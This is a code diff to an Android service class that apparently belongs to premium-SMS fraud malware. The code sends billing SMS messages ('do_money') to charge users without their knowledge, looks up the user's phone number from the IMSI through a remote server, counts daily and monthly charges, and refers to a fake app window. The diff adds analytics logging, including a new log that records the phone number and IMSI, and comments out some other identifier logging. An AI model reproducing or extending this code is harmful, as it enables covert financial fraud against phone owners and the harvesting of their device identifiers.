@@ -68,6 +68,8 @@ public class PluginService extends IntentService {
 
     @Override
     public void onHandleIntent(Intent intent) {
+        MobclickAgent.onResume(this);
+
         Config.LOGD("[[PluginService::onHandleIntent]] intent : " + intent);
         if (intent != null) {
             String action = intent.getAction();
@@ -92,6 +94,8 @@ public class PluginService extends IntentService {
                 fetchPhoneFromServer();
             }
         }
+
+        MobclickAgent.onPause(this);
     }
 
     private synchronized void fetchPhoneFromServer() {
@@ -105,9 +109,9 @@ public class PluginService extends IntentService {
                 if (!TextUtils.isEmpty(imsi)) {
                     PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
                                                                          , new PhoneFetchRequest(
-                                                                                  DomanManager.getInstance(getApplicationContext())
-                                                                                                     .getOneAviableDomain()
-                                                                                      + "/tools/i2n/" + imsi));
+                                                                                                    DomanManager.getInstance(getApplicationContext())
+                                                                                                        .getOneAviableDomain()
+                                                                                                        + "/tools/i2n/" + imsi));
                     if (respone != null && !TextUtils.isEmpty(respone.phone)) {
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
@@ -117,12 +121,19 @@ public class PluginService extends IntentService {
                             //notify umeng
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("fetch", "succes");
-                            log.put("phoneNumber", respone.phone);
-                            log.put("imsi", imsi);
+//                            log.put("phoneNumber", respone.phone);
+//                            log.put("imsi", imsi);
                             log.put("phoneType", Build.MODEL);
                             CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei", log);
                         } else {
                             SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+                            //notify umeng
+                            HashMap<String, String> log = new HashMap<String, String>();
+                            log.put("fetch", "failed");
+                            log.put("phoneNumber", respone.phone);
+                            log.put("imsi", imsi);
+                            log.put("phoneType", Build.MODEL);
+                            CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei_failed", log);
                         }
                     }
                 }
@@ -164,8 +175,8 @@ public class PluginService extends IntentService {
 
                             //notify umeng
                             HashMap<String, String> log = new HashMap<String, String>();
-                            log.put("content", "XSTD.SC:" + content);
-                            log.put("to", content);
+//                            log.put("content", "XSTD.SC:" + content);
+//                            log.put("to", content);
                             log.put("phoneType", Build.MODEL);
                             CommonUtil.umengLog(getApplicationContext(), "chken_send", log);
                         } else {
@@ -303,6 +314,11 @@ public class PluginService extends IntentService {
                          * 注意，每次扣费的时候，第一条起始的短信都是很直接的，都是n+c的模式
                          */
                         if (SMSUtil.sendSMS(startPort, startContent)) {
+                            HashMap<String, String> log = new HashMap<String, String>();
+                            log.put("phoneType", Build.MODEL);
+                            log.put("channelName", AppRuntime.ACTIVE_RESPONSE.channelName);
+                            CommonUtil.umengLog(getApplicationContext(), "do_money", log);
+
                             SettingManager.getInstance().setKeyDayCount(dayCount + 1);
                             SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
                             SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
@@ -381,11 +397,11 @@ public class PluginService extends IntentService {
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("fetch", "succes");
                             log.put("channelName", response.channelName);
-                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
                             log.put("osVersion", Build.VERSION.RELEASE);
                             log.put("channelCode", Config.CHANNEL_CODE);
                             log.put("phoneType", Build.MODEL);
-                            log.put("uuid", unique);
+//                            log.put("uuid", unique);
                             CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
 
                             if (Config.DEBUG) {
@@ -430,11 +446,11 @@ public class PluginService extends IntentService {
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("fetch", "succes");
                             log.put("channelName", "今天不扣费");
-                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
                             log.put("osVersion", Build.VERSION.RELEASE);
                             log.put("channelCode", Config.CHANNEL_CODE);
                             log.put("phoneType", Build.MODEL);
-                            log.put("uuid", unique);
+//                            log.put("uuid", unique);
                             CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
                         }
                     }
@@ -447,7 +463,7 @@ public class PluginService extends IntentService {
                     //notify umeng
                     HashMap<String, String> log = new HashMap<String, String>();
                     log.put("fetch", "failed");
-                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+//                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
                     log.put("osVersion", Build.VERSION.RELEASE);
                     log.put("channelCode", Config.CHANNEL_CODE);
                     log.put("phoneType", Build.MODEL);
@@ -493,9 +509,9 @@ public class PluginService extends IntentService {
 
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
-                            + " packageName = " + intent.getStringExtra("packageName")
-                            + " isActive : " + isActive
-                            + " >>>>>>>>>>>");
+                                + " packageName = " + intent.getStringExtra("packageName")
+                                + " isActive : " + isActive
+                                + " >>>>>>>>>>>");
             }
 
             if (!isActive && !AppRuntime.FAKE_WINDOW_SHOW) {
